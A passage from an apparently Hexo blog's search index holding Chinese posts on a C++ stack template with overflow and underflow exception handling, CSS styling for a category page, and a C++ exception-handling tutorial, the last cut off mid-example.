      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出的异常处理</title>
      <link href="/post/71ad48f.html"/>
      <url>/post/71ad48f.html</url>
      
        <content type="html"><![CDATA[<p><strong>【问题描述】</strong></p><p>下面程序定义栈类模板<code>StackTemplate</code>，创建栈对象存储<code>斐波那契数列</code>的前10项数值，并以后进先出的方式取出元素并输出，输出结果为：55 34 21 13 8 5 3 2 1 1。其中<code>void push(const T&amp; i)</code>函数为添加元素、<code>T pop()</code>函数为取出栈顶元素，<code>int fibonacci(int n)</code>函数为计算斐波那契数列的第n项值。在计算斐波那契数列值、添加元素和取出元素的过程中要进行上溢<code>OverFlow</code>或者下溢<code>UnderFlow</code>的异常处理。</p><p><strong>【样例输入】</strong></p><p>无</p><p><strong>【样例输出】</strong></p><p>55  34  21  13  8  5  3  2  1  1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义枚举类型ERROR，其包含两个枚举常量UnderFlow和OverFlow，值分别默认为0和1，表示下溢和上溢</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">ERROR</span> &#123; UnderFlow, OverFlow &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fibonacci</span><span class="params">(<span class="type">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span>  <span class="title class_">StackTemplate</span> &#123;</span><br><span class="line"><span class="keyword">enum</span> &#123; size = <span class="number">100</span> &#125;;</span><br><span class="line">T stack[size];</span><br><span class="line"><span class="type">int</span> top;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">StackTemplate</span>() : <span class="built_in">top</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">const</span> T &amp;i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (top &gt;= size)</span><br><span class="line"><span class="keyword">throw</span> OverFlow;</span><br><span class="line">stack[top++] = i;<span class="comment">// 先赋值再自增，栈顶指针指向的是还没有初始化的位置</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">T <span class="title">pop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (top &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">throw</span> UnderFlow;</span><br><span class="line"><span class="keyword">return</span> stack[--top];<span class="comment">// 注意这里栈顶指针应该先减再取值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getTop</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> top;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">StackTemplate&lt;<span class="type">int</span>&gt; is;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">is.<span class="built_in">push</span>(<span class="built_in">fibonacci</span>(i+<span class="number">1</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">10</span>; k++)</span><br><span class="line">cout &lt;&lt; <span class="built_in">setw</span>(<span class="number">5</span>) &lt;&lt; left &lt;&lt; is.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span> (ERROR e)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (e)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span>  OverFlow: </span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;触发上溢错误！&quot;</span> &lt;&lt; endl;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">case</span>  UnderFlow: </span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;触发下溢错误！&quot;</span> &lt;&lt; endl;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span> (...)<span class="comment">// 通用捕获异常</span></span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;未知错误！&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fibonacci</span><span class="params">(<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> sz = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> f[sz];<span class="comment">// 注意这里应该定义为静态变量，储存之间计算出的结果</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &gt; sz)</span><br><span class="line"><span class="keyword">throw</span> OverFlow;</span><br><span class="line"></span><br><span class="line">f[<span class="number">0</span>] = f[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)</span><br><span class="line"><span class="keyword">if</span> (f[i] == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">// i &gt;= 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当n==1或2时，不进入循环，返回的都是f[1](f[0] == f[1]，所以结果不影响)</span></span><br><span class="line"><span class="keyword">while</span> (i &lt; n)</span><br><span class="line">&#123;</span><br><span class="line">f[i] = f[i - <span class="number">1</span>] + f[i - <span class="number">2</span>];</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> f[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分类页基础美化</title>
      <link href="/post/1f3575f8.html"/>
      <url>/post/1f3575f8.html</url>
      
        <content type="html"><![CDATA[<p>在<code>Blog根目录\source\css\custom.css</code>(缺少的文件/文件夹直接新建)新增如下样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 分类页样式 began */</span></span><br><span class="line"><span class="selector-class">.category-list-link</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.1</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">10px</span> <span class="number">10px</span> <span class="number">15px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">12</span>), <span class="number">0</span> <span class="number">0</span> <span class="number">6px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">104</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">0.1</span>);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">6px</span> <span class="number">16px</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">  <span class="attribute">transition-duration</span>: <span class="number">0.15s</span>;</span><br><span class="line">  //<span class="attribute">display</span>:flex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.category-list-link</span><span class="selector-pseudo">:before</span>&#123;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">18px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">18px</span>;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;📚&quot;</span>;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">font</span>: normal normal normal <span class="number">14px</span>/<span class="number">1</span> FontAwesome;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">18px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 分类页样式 end */</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++异常详解</title>
      <link href="/post/3a0c5cfa.html"/>
      <url>/post/3a0c5cfa.html</url>
      
        <content type="html"><![CDATA[<h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>异常在被调函数中触发，不断传向下一级主调函数，直到被捕获</p><p><code>ps</code>：若异常无法被捕获，程序会调用库函数terminate，由库函数调用abort函数终止程序</p><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><h3 id="1-throw"><a href="#1-throw" class="headerlink" title="1. throw"></a>1. throw</h3><p><code>throw</code> + 表达式：抛出异常</p><p><code>ps</code>：表达式可以是数据，也可以是函数(<strong>必须有返回值</strong>)</p><h3 id="2-try-catch"><a href="#2-try-catch" class="headerlink" title="2. try + catch"></a>2. try + catch</h3><p><code>ps</code>：<code>catch (...)</code>表示通用捕获，任何异常均可捕获，但是无法获取异常的值，一般放在所有<code>catch</code>最后</p><p>注：<code>catch (基类异常)</code>可以捕获派生类异常，若基类异常和派生类异常同存，一般将基类异常的捕获放在后面</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span> (exception &amp;e)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span> (...)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h3 id="除零异常"><a href="#除零异常" class="headerlink" title="除零异常"></a>除零异常</h3><p>分析：<code>try</code>块处理了三个除法(15~17行)；第二个除法除数为0，<code>divide</code>抛出被除数8被捕获并打印异常信息</p><p><code>ps</code>：<code>try</code>当中抛出异常后的语句无法执行，对应第三个除法(17行)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">divide</span><span class="params">(<span class="type">float</span> x, <span class="type">float</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == y)</span><br><span class="line"><span class="keyword">throw</span> x;</span><br><span class="line"><span class="keyword">return</span> x / y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span> </span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;5 / 2 = &quot;</span> &lt;&lt; <span class="built_in">divide</span>(<span class="number">5</span>, <span class="number">2</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;8 / 0 = &quot;</span> &lt;&lt; <span class="built_in">divide</span>(<span class="number">8</span>, <span class="number">0</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;7 / 1 = &quot;</span> &lt;&lt; <span class="built_in">divide</span>(<span class="number">7</span>, <span class="number">1</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(<span class="type">float</span> e)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; e &lt;&lt; <span class="string">&quot; is divided by zero!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="异常接口声明"><a href="#异常接口声明" class="headerlink" title="异常接口声明"></a>异常接口声明</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> <span class="title">throw</span><span class="params">(A, B, C, D)</span><span class="comment">// A, B, C, D表示可能抛出的异常类型；func()可能抛出异常，须放在try当中</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> <span class="title">throw</span><span class="params">()</span><span class="comment">// 表示func()函数一定不会抛出异常</span></span></span><br></pre></td></tr></table></figure><h2 id="异常处理中的构造与析构"><a href="#异常处理中的构造与析构" class="headerlink" title="异常处理中的构造与析构"></a>异常处理中的构造与析构</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>从对应的<code>try</code>块开始到异常被抛出之间构造(且尚未析构)的所有自动对象进行析构</p><p><code>ps</code>：若异常不被捕获则无法析构</p><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>分析：主要观察<code>demo</code>的析构是否被执行</p><p><strong>异常可以被捕获：</strong></p><p><code>demo</code>在退出<code>try</code>块之后正常析构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyException</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">MyException</span>(<span class="type">const</span> string &amp;message) : <span class="built_in">message</span>(message) &#123;&#125;</span><br><span class="line"><span class="function"><span class="type">const</span> string &amp;<span class="title">getMessage</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> message; &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">string message;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Demo</span>() &#123; cout &lt;&lt; <span class="string">&quot;Constructor of Demo&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">~<span class="built_in">Demo</span>() &#123; cout &lt;&lt; <span class="string">&quot;Destructor of Demo&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> <span class="title">throw</span><span class="params">(MyException)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Demo demo;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Throw MyException in func()&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">throw</span> <span class="built_in">MyException</span>(<span class="string">&quot;exception thrown by func()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">func</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(MyException &amp;e)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; e.<span class="built_in">getMessage</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><details class="folding-tag" ><summary> 正常析构 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/06/08/pCkVzz8.png" alt=""></p>              </div>            </details><p><strong>异常无法被捕获：</strong></p><p>库函数terminate调用abort函数终止程序，<code>demo</code>未被析构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyException</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">MyException</span>(<span class="type">const</span> string &amp;message) : <span class="built_in">message</span>(message) &#123;&#125;</span><br><span class="line"><span class="function"><span class="type">const</span> string &amp;<span class="title">getMessage</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> message; &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">string message;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Demo</span>() &#123; cout &lt;&lt; <span class="string">&quot;Constructor of Demo&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">~<span class="built_in">Demo</span>() &#123; cout &lt;&lt; <span class="string">&quot;Destructor of Demo&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> <span class="title">throw</span><span class="params">(MyException)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Demo demo;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Throw MyException in func()&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">throw</span> <span class="built_in">MyException</span>(<span class="string">&quot;exception thrown by func()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">func</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(<span class="type">int</span> e)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; e &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><details class="folding-tag" ><summary> 无法析构 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/06/08/pCkZpQS.png" alt=""></p>              </div>            </details><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ul><li>异常没有被捕获导致应该自动化析构的对象没有被释放</li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ul><li>在所有<code>catch</code>最后加一个<code>catch（...）</code>捕获所有类型的异常</li></ul><h2 id="标准程序库的异常类"><a href="#标准程序库的异常类" class="headerlink" title="标准程序库的异常类"></a>标准程序库的异常类</h2><h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdexcept&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="异常类汇总"><a href="#异常类汇总" class="headerlink" title="异常类汇总"></a>异常类汇总</h3><details class="folding-tag" ><summary> 点击查看 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/06/07/pCkSlOx.png" alt=""></p>              </div>            </details><h3 id="常用异常类"><a href="#常用异常类" class="headerlink" title="常用异常类"></a>常用异常类</h3><ul><li><code>exception</code>：标准程序库异常类的公共基类</li><li><code>logic_error</code>：表示可以在程序中被预先检测到的异常(这类异常可以避免)</li><li><code>runtime_error</code>：表示难以被预先检测到的异常</li></ul><h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><p><strong>三角形面积计算</strong></p><p>判断边长是否合理(为正数且满足三角不等式)，不合理抛出<code>invalid_argument</code>异常；合理则输出三角形面积</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdexcept&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">area</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b, <span class="type">double</span> c)</span> <span class="title">throw</span><span class="params">(invalid_argument)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 判断边长是否为正</span></span><br><span class="line"><span class="keyword">if</span> (a &lt;= <span class="number">0</span> || b &lt;= <span class="number">0</span> || c &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="built_in">invalid_argument</span>(<span class="string">&quot;The side length should be positive!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断边长是否满足三角不等式</span></span><br><span class="line"><span class="keyword">if</span> (a + b &lt;= c || a + c &lt;= b || b + c &lt;= a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="built_in">invalid_argument</span>(<span class="string">&quot;The side length should fit the triangle inequaltion!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 海伦公式计算面积</span></span><br><span class="line"><span class="type">double</span> aver = (a + b + c) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">sqrt</span>(aver * (aver - a) * (aver - b) * (aver - c));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 